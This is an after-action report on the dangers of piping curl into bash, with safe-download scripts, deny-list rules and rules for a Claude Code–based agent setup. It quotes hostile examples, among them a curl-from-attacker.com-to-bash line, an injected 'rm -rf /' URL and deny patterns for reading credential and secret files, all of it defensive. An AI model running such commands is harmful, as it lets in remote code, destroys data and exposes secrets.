# AAR: curl Security Research and MESO Guidelines

**Date**: 2026-02-06
**Author**: Rowan Valle
**Tool**: Built with Claude Code
**Purpose**: Document security implications of curl usage and establish MESO-specific guidelines

---

## Executive Summary

Piping curl/wget output directly to bash (`curl | bash`) is a high-risk operation that enables multiple attack vectors including MITM attacks, server-side detection evasion, and connection interruption exploits. This research documents the threat model and provides actionable guidelines for MESO's security framework.

**Key Finding**: The current MESO deny-list correctly prohibits direct piping but lacks guidance on safe curl usage patterns. This AAR provides specific recommendations for both deny-list maintenance and safe automation patterns.

---

## 1. The Security Prohibition: Why `curl | bash` is Dangerous

### Attack Vectors

#### 1.1 Man-in-the-Middle (MITM) Attacks
When curl pipes directly to bash, an attacker positioned between you and the server can modify the script in transit. Without certificate verification or content inspection, the modified malicious commands execute with your full privileges.

**Severity**: Critical when combined with:
- Public WiFi or untrusted networks
- Compromised DNS
- Certificate verification disabled (`-k` flag)
- Running as root or with sudo

#### 1.2 Server-Side Detection and Adaptive Attacks
A sophisticated attack pattern exploits bash's buffering behavior. When content exceeds buffer size, bash begins executing commands before curl finishes downloading. Attackers detect this by:

1. Measuring request timing patterns
2. Using sleep commands to create distinctive pauses
3. Detecting whether content is being inspected (file write) vs. executed (pipe)
4. Serving different content based on detection

**Example Attack Pattern**:
```bash
# Server detects piping by timing analysis
# Serves benign content when downloaded
curl https://attacker.com/script.sh > inspect.sh  # Gets safe script

# Serves malicious payload when piped
curl https://attacker.com/script.sh | bash        # Gets exploit
```

#### 1.3 Connection Interruption Exploits
If the network connection drops mid-download, bash may execute a partial script. This can:
- Leave the system in an inconsistent state
- Execute commands without their safety checks
- Create security vulnerabilities through incomplete setup

#### 1.4 Supply Chain Attacks
Even HTTPS-served content from legitimate domains can be compromised through:
- Compromised web server infrastructure
- Dependency confusion in hosted scripts
- Account takeover of package maintainers
- DNS hijacking targeting the download domain

### Real-World Examples

**Synology Photos CVE (Pwn2Own 2024)**: Exploited unauthenticated WebSocket to achieve RCE through command injection in exec() call.

**Detection Evasion**: Attackers craft scripts with timing-based detection that serve different payloads to piped vs. file-based downloads, defeating manual inspection attempts.

---

## 2. Safe curl Patterns

### 2.1 When curl is Safe to Use

curl is appropriate for:
- **API interactions** with known, authenticated endpoints
- **File downloads** with subsequent verification before execution
- **Data retrieval** that doesn't execute (JSON/XML parsing, data ingestion)
- **Internal services** on trusted networks with certificate pinning

curl requires extreme caution for:
- **Script downloads** from any source
- **Package managers** and installers
- **Configuration downloads** that modify system state
- **Any content that will be executed**

### 2.2 Required Safety Flags

**Minimum Required Flags** (production-ready curl):
```bash
curl --fail --silent --show-error --location --max-time 30 \
     --retry 3 --retry-delay 5 --retry-max-time 60 \
     https://example.com/file
```

**Flag Explanations**:
- `--fail` (`-f`): Exit with error on HTTP errors (4xx, 5xx), prevents silent failures
- `--silent` (`-s`): Suppress progress meter (not the same as suppressing errors)
- `--show-error` (`-S`): Show errors even with `--silent`
- `--location` (`-L`): Follow redirects (with caution, see redirect section)
- `--max-time <seconds>`: Total timeout for operation, prevents DoS via slow responses
- `--retry <num>`: Retry on transient failures
- `--retry-delay <seconds>`: Wait between retries
- `--retry-max-time <seconds>`: Maximum time for all retries

**Additional Security Flags**:
```bash
# Certificate verification (default, but explicit is better)
--cacert /etc/ssl/certs/ca-certificates.crt

# Maximum redirect depth (limit redirect chains)
--max-redirs 3

# Fail on redirect to different host (prevent redirect attacks)
--proto-redir =https

# Only allow HTTPS
--proto =https

# Connect timeout (separate from total timeout)
--connect-timeout 10

# Limit download size (prevent resource exhaustion)
--max-filesize 10485760  # 10MB
```

### 2.3 HTTPS Verification and Certificate Checking

**Never Disable Verification**:
```bash
# WRONG - disables certificate validation
curl -k https://example.com/script.sh  # Vulnerable to MITM

# WRONG - disables peer verification
curl --insecure https://example.com/script.sh

# CORRECT - verify certificates (default behavior)
curl https://example.com/script.sh
```

**Why This Matters**: Disabling certificate verification makes HTTPS as insecure as HTTP. MITM attackers can intercept and modify content without detection.

**When `-k` Might Be Acceptable** (still discouraged):
- Local development with self-signed certificates
- Internal staging environments with proper network isolation
- Debugging certificate issues (never in production)

**Better Alternative for Internal CAs**:
```bash
# Trust a custom CA without disabling all verification
curl --cacert /path/to/internal-ca.crt https://internal.example.com/
```

### 2.4 Redirect Handling

Redirects are a common attack vector. An attacker can compromise `http://trusted.com` to redirect to `http://evil.com`.

**Safe Redirect Handling**:
```bash
# Limit redirect depth
curl --max-redirs 3 --location https://example.com/

# Prevent redirect to different protocol (e.g., HTTPS -> HTTP)
curl --proto-redir =https --location https://example.com/

# Log redirects for audit
curl --location --write-out "Final URL: %{url_effective}\n" \
     https://example.com/ > output.txt
```

### 2.5 Validation Before Execution

**The Safe Pattern** (always use this for scripts):
```bash
#!/bin/bash
set -euo pipefail  # Exit on error, undefined vars, pipe failures

SCRIPT_URL="https://trusted.example.com/install.sh"
CHECKSUM_URL="https://trusted.example.com/install.sh.sha256"
GPG_SIG_URL="https://trusted.example.com/install.sh.asc"

# Download script
curl --fail --silent --show-error --location \
     --max-time 30 --proto =https \
     --output install.sh \
     "$SCRIPT_URL"

# Download checksum
curl --fail --silent --show-error --location \
     --max-time 30 --proto =https \
     --output install.sh.sha256 \
     "$CHECKSUM_URL"

# Verify checksum
echo "Verifying checksum..."
sha256sum --check install.sh.sha256 || {
    echo "ERROR: Checksum verification failed"
    exit 1
}

# Optional: GPG signature verification (stronger than checksum)
if command -v gpg &> /dev/null; then
    curl --fail --silent --show-error --location \
         --max-time 30 --proto =https \
         --output install.sh.asc \
         "$GPG_SIG_URL"

    gpg --verify install.sh.asc install.sh || {
        echo "ERROR: GPG signature verification failed"
        exit 1
    }
fi

# MANUAL INSPECTION REQUIRED
echo "Script downloaded and verified."
echo "Please inspect install.sh before running:"
echo "  less install.sh"
echo ""
echo "To execute after inspection:"
echo "  bash install.sh"
```

### 2.6 Checksum vs. GPG Signature Verification

**Checksum (SHA256)**:
- Verifies integrity (file not corrupted or tampered with in transit)
- Does NOT verify authenticity (who created it)
- Can be compromised if attacker controls both file and checksum

**GPG Signature**:
- Verifies integrity AND authenticity
- Proves the file was signed by holder of private key
- Requires trusting the public key (verify key fingerprint through multiple channels)
- Superior to checksums when available

**Verification Process**:
```bash
# Import trusted public key (verify fingerprint independently!)
gpg --keyserver keyserver.ubuntu.com --recv-keys ABCD1234...

# Verify signature
gpg --verify file.asc file.tar.gz

# Good signature output:
# gpg: Good signature from "Trusted Developer <dev@example.com>"
# gpg: WARNING: This key is not certified with a trusted signature!
#      (This warning is normal if you haven't personally signed the key)
```

---

## 3. MESO-Specific Guidelines

### 3.1 Operations Requiring User Approval (L1 Operator)

The following curl operations MUST have explicit operator approval:

1. **Script downloads for execution** (any shell script, Python script, binary)
2. **Installer downloads** (package managers, system setup scripts)
3. **Configuration downloads** that modify system state
4. **Downloads from new/unverified domains**
5. **Any operation with `-k` / `--insecure` flag**
6. **Downloads that will run with elevated privileges**
7. **Downloads over HTTP** (unencrypted)

**Implementation**: These should trigger an L1 autonomy escalation requiring operator review of:
- Source domain and trust level
- What the downloaded content will do
- Verification strategy (checksum, GPG, manual inspection)
- Risk assessment

### 3.2 Safe Automated Operations (L2/L3)

curl can be automated for:

1. **API calls** to known, authenticated endpoints
   ```bash
   curl --fail --silent --show-error --max-time 30 \
        -H "Authorization: Bearer $TOKEN" \
        https://api.trusted.com/data
   ```

2. **JSON/XML data retrieval** (not executed)
   ```bash
   curl --fail --silent --show-error --max-time 30 \
        https://api.example.com/data.json | jq .
   ```

3. **Package registry queries** (metadata only)
   ```bash
   curl --fail --silent --show-error --max-time 30 \
        https://registry.npmjs.org/package-name
   ```

4. **Health checks and monitoring**
   ```bash
   curl --fail --silent --max-time 5 \
        https://service.internal.com/health
   ```

### 3.3 Preventing Injection Attacks

**Command Injection via URL**:
```bash
# WRONG - user input in URL without validation
USER_INPUT="https://evil.com; rm -rf /"
curl "$USER_INPUT"  # Shell interprets the semicolon

# CORRECT - validate URL format first
if [[ $USER_INPUT =~ ^https://[a-zA-Z0-9.-]+/ ]]; then
    curl "$USER_INPUT"
else
    echo "Invalid URL format"
    exit 1
fi
```

**Header Injection**:
```bash
# WRONG - unsanitized header value
USER_HEADER="value\nX-Admin: true"
curl -H "X-Custom: $USER_HEADER" https://api.com/

# CORRECT - validate header value
if [[ $USER_HEADER =~ $'\n' ]]; then
    echo "Invalid header value (contains newline)"
    exit 1
fi
```

**Filename Injection**:
```bash
# WRONG - user controls filename
curl https://example.com/file --output "$USER_FILENAME"

# CORRECT - validate filename
SAFE_FILENAME=$(basename "$USER_FILENAME" | tr -cd '[:alnum:]._-')
curl https://example.com/file --output "$SAFE_FILENAME"
```

### 3.4 Error Handling and Validation

**Comprehensive Error Handling**:
```bash
#!/bin/bash
set -euo pipefail

download_safe() {
    local url="$1"
    local output="$2"
    local max_size="${3:-10485760}"  # 10MB default

    # Validate URL
    if [[ ! $url =~ ^https:// ]]; then
        echo "ERROR: Only HTTPS URLs allowed" >&2
        return 1
    fi

    # Validate output path
    if [[ ! $output =~ ^[a-zA-Z0-9._/-]+$ ]]; then
        echo "ERROR: Invalid output filename" >&2
        return 1
    fi

    # Download with safety flags
    local http_code
    http_code=$(curl --fail --silent --show-error --location \
                     --max-time 30 --connect-timeout 10 \
                     --max-filesize "$max_size" \
                     --max-redirs 3 --proto-redir =https \
                     --write-out "%{http_code}" \
                     --output "$output" \
                     "$url")

    if [[ $http_code -ne 200 ]]; then
        echo "ERROR: HTTP $http_code from $url" >&2
        rm -f "$output"
        return 1
    fi

    # Verify file was actually written
    if [[ ! -f $output ]]; then
        echo "ERROR: Download failed, no output file" >&2
        return 1
    fi

    # Check file size
    local size
    size=$(stat --format=%s "$output")
    if [[ $size -eq 0 ]]; then
        echo "ERROR: Downloaded file is empty" >&2
        rm -f "$output"
        return 1
    fi

    echo "Downloaded successfully: $output ($size bytes)"
    return 0
}

# Usage
download_safe "https://example.com/file.tar.gz" "./file.tar.gz" || exit 1
```

---

## 4. Recommended Safeguards for MESO

### 4.1 Deny-List Patterns (Keep Current + Additions)

**Current patterns (maintain these)**:
```json
"Bash(curl * | bash)",
"Bash(curl * | sh)",
"Bash(wget * | bash)",
"Bash(wget * | sh)"
```

**Recommended additions**:
```json
"Bash(curl -k *)",
"Bash(curl --insecure *)",
"Bash(wget --no-check-certificate *)",
"Bash(curl * -k *)",
"Bash(curl * --insecure *)",
"Bash(curl http://*)",  // Block unencrypted HTTP
"Bash(wget http://*)"
```

**Rationale**: These patterns catch certificate verification bypass attempts and unencrypted downloads, both high-risk operations requiring L1 approval.

### 4.2 Allow-List Patterns (Safe Operations)

While MESO uses a deny-list model, these patterns represent low-risk operations that can proceed with L2/L3 autonomy:

**Safe curl patterns**:
- `curl --fail -s -S https://api.trusted.com/*` (API calls with proper flags)
- `curl https://* --output file.json` (download to file for inspection)
- `curl https://* -I` (HEAD request for metadata only)

**Context Required**:
- Domain trust level (is example.com in the operator's trusted domains?)
- Whether output will be executed vs. parsed
- Whether verification (checksum/GPG) is planned

### 4.3 Enhanced Security Zooid Rules

Recommended additions to `/home/Valis/.claude/rules/04-security.md`:

```markdown
## curl/wget Security
- NEVER pipe curl or wget output to bash/sh/python/any interpreter
- NEVER use `-k`, `--insecure`, or `--no-check-certificate` flags
- NEVER download scripts over HTTP (unencrypted)
- ALWAYS download to file, verify (checksum/GPG), inspect, then execute
- ALWAYS use minimum safety flags: `--fail -s -S --max-time 30 --proto =https`
- ALWAYS validate URLs before use in curl commands
- Downloads for execution require L1 approval with explicit verification plan

### Safe Download Pattern
1. Download to temporary file with safety flags
2. Verify integrity (SHA256 checksum minimum, GPG signature preferred)
3. Manual inspection by operator for scripts
4. Execute only after operator approval

### Checksum Verification
```bash
# Download file and checksum
curl --fail -s -S --max-time 30 -o file.tar.gz https://example.com/file.tar.gz
curl --fail -s -S --max-time 30 -o file.tar.gz.sha256 https://example.com/file.tar.gz.sha256

# Verify
sha256sum --check file.tar.gz.sha256 || { echo "Checksum failed"; exit 1; }
```

### GPG Signature Verification (Preferred)
```bash
# Import trusted key (verify fingerprint out-of-band!)
gpg --keyserver keyserver.ubuntu.com --recv-keys FINGERPRINT

# Download file and signature
curl --fail -s -S --max-time 30 -o file.tar.gz https://example.com/file.tar.gz
curl --fail -s -S --max-time 30 -o file.tar.gz.asc https://example.com/file.tar.gz.asc

# Verify
gpg --verify file.tar.gz.asc file.tar.gz || { echo "Signature invalid"; exit 1; }
```
```

### 4.4 Settings File Updates

Current deny-list in `/home/Valis/.claude/settings.local.json` is good but can be enhanced:

```json
{
  "permissions": {
    "allow": [
      "Bash",
      "Read",
      "Write",
      "Edit",
      "WebSearch",
      "WebFetch"
    ],
    "deny": [
      "Bash(rm -rf /)",
      "Bash(rm -rf ~)",
      "Bash(rm -rf $HOME)",
      "Bash(rm -rf .)",
      "Bash(git push --force *)",
      "Bash(git reset --hard *)",
      "Bash(git checkout .)",
      "Bash(git checkout -- .)",
      "Bash(git clean -f*)",
      "Bash(git restore .)",
      "Bash(chmod 777 *)",
      "Bash(curl * | bash)",
      "Bash(curl * | sh)",
      "Bash(curl * | python*)",
      "Bash(wget * | bash)",
      "Bash(wget * | sh)",
      "Bash(wget * | python*)",
      "Bash(curl -k *)",
      "Bash(curl * -k *)",
      "Bash(curl --insecure *)",
      "Bash(curl * --insecure *)",
      "Bash(wget --no-check-certificate *)",
      "Bash(cat .env*)",
      "Bash(cat *credentials*)",
      "Bash(cat *secret*)",
      "Bash(cat *password*)",
      "Bash(cat *token*)"
    ]
  }
}
```

**New patterns explained**:
- `curl * | python*` - prevents piping to Python interpreter
- `curl -k` patterns - prevents certificate verification bypass
- Additional secret patterns - password, token files

---

## 5. Implementation Checklist

### Immediate Actions
- [ ] Review and update `/home/Valis/.claude/rules/04-security.md` with curl-specific rules
- [ ] Update `/home/Valis/.claude/settings.local.json` deny-list with additional patterns
- [ ] Document safe download pattern as a template in STANDING-ORDERS.md
- [ ] Create `curl-safety-template.sh` helper script for verified downloads

### Template Helper Script
Create `/home/Valis/.claude/templates/safe-download.sh`:

```bash
#!/bin/bash
# Safe Download Template for MESO
# Usage: ./safe-download.sh <url> <output-file> [checksum-url]

set -euo pipefail

if [[ $# -lt 2 ]]; then
    echo "Usage: $0 <url> <output-file> [checksum-url]"
    exit 1
fi

URL="$1"
OUTPUT="$2"
CHECKSUM_URL="${3:-}"

# Validate HTTPS
if [[ ! $URL =~ ^https:// ]]; then
    echo "ERROR: Only HTTPS URLs allowed" >&2
    exit 1
fi

# Download with safety flags
echo "Downloading from $URL..."
curl --fail --silent --show-error --location \
     --max-time 30 --connect-timeout 10 \
     --max-redirs 3 --proto-redir =https \
     --output "$OUTPUT" \
     "$URL"

# Verify if checksum provided
if [[ -n $CHECKSUM_URL ]]; then
    echo "Downloading checksum..."
    curl --fail --silent --show-error --location \
         --max-time 30 \
         --output "$OUTPUT.sha256" \
         "$CHECKSUM_URL"

    echo "Verifying checksum..."
    sha256sum --check "$OUTPUT.sha256" || {
        echo "ERROR: Checksum verification failed" >&2
        exit 1
    }
    echo "Checksum verified successfully"
fi

echo "Download complete: $OUTPUT"
echo "MANUAL INSPECTION REQUIRED before execution"
```

### Operator Training Points
- Recognize `curl | bash` patterns in documentation and tutorials
- Question any installation instructions using piped curl
- Prefer package managers (apt, dnf, npm) over curl-based installers
- When curl installer is unavoidable: inspect, verify, then execute
- Treat all downloaded scripts as untrusted until verified

### Audit Points (Session Checklist Addition)
- Did any curl/wget commands run this session?
- Were downloads verified before execution?
- Were certificate verification flags appropriate?
- Were timeouts set to prevent DoS?
- Was domain trust level verified for new sources?

---

## 6. References and Further Reading

### Primary Sources
- [The Dangers of curl | bash](https://lukespademan.com/blog/the-dangers-of-curlbash/)
- [Another reason why piping the outputs of curl into bash is a security risk](https://www.lesinskis.com/dont-pipe-curl-into-bash.html)
- [Friends don't let friends Curl | Bash](https://www.sysdig.com/blog/friends-dont-let-friends-curl-bash/)
- [Piping curl to bash: Convenient but risky](https://sasha.vincic.org/blog/2024/09/piping-curl-to-bash-convenient-but-risky)
- [How to build a trustworthy curl pipe bash workflow](https://dev.to/operous/how-to-build-a-trustworthy-curl-pipe-bash-workflow-4bb)

### OWASP and Security Standards
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP Transport Layer Protection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Protection_Cheat_Sheet.html)
- [libcurl Security Considerations](https://curl.se/libcurl/security.html)

### Certificate and Download Verification
- [How to Verify a GPG Signature](https://www.devdungeon.com/content/how-verify-gpg-signature)
- [How to Verify PGP Signature of Downloaded Software on Linux](https://www.linuxbabe.com/security/verify-pgp-signature-software-downloads-linux)
- [Verifying the Integrity of ISC Downloads using PGP / GPG](https://kb.isc.org/docs/aa-01225)

### curl Security Best Practices
- [PHP cURL in 2026: A Practical, Production-Ready Guide](https://thelinuxcode.com/php-curl-in-2026-a-practical-productionready-guide/)
- [How to Safely Use cURL to Ignore SSL Errors: A Complete Guide](https://iproyal.com/blog/curl-ignore-ssl/)
- [curl CVE List](https://curl.se/docs/security.html)

### Attack Vectors and Exploits
- [Mastering API Exploitation: Crafting Reverse Shells via cURL](https://danaepp.com/mastering-api-exploitation-crafting-reverse-shells-via-curl)
- [Command Injection - HackTricks](https://book.hacktricks.xyz/pentesting-web/command-injection)
- [curl bash pipe - Security Discussion](https://www.kicksecure.com/wiki/Dev/curl_bash_pipe)

---

## Conclusion

The `curl | bash` pattern is dangerous because it combines automatic execution with multiple attack vectors: MITM, detection evasion, connection interruption, and supply chain compromise. MESO's current deny-list correctly prohibits this pattern.

Safe curl usage requires:
1. **Never pipe to interpreters** - always download to file first
2. **Always verify** - checksums minimum, GPG signatures preferred
3. **Always use safety flags** - timeouts, certificate verification, failure handling
4. **Always inspect before execution** - manual review by operator
5. **L1 approval for execution** - scripts and installers require explicit authorization

The recommended deny-list additions prevent certificate verification bypass and unencrypted downloads, closing additional attack vectors while maintaining usability for legitimate API and data retrieval use cases.

---

**Built with Claude Code**
**By Symbiont Systems LLC**
